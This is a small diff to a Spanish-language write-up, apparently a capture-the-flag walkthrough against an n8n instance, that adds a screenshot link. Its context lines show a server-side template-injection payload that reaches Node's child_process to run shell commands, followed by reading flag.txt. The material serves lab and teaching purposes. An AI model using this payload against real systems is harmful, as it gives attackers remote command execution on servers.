@@ -41,7 +41,7 @@ Se construyó un payload malicioso estructurado de la siguiente forma para forza
 {{ this.constructor.constructor("return process.mainModule.require('child_process').execSync('ls').toString()")() }}
 ```
 
-![Captura resultado ls]()
+![Captura resultado ls](img/n8n_ls_result.png)
 
 El comando se ha ejecutado con éxito y podemos observar que hay un archivo **flag.txt**. Ejecutando ahora `cat flag.txt` nos muestra la flag que búscabamos. 
 
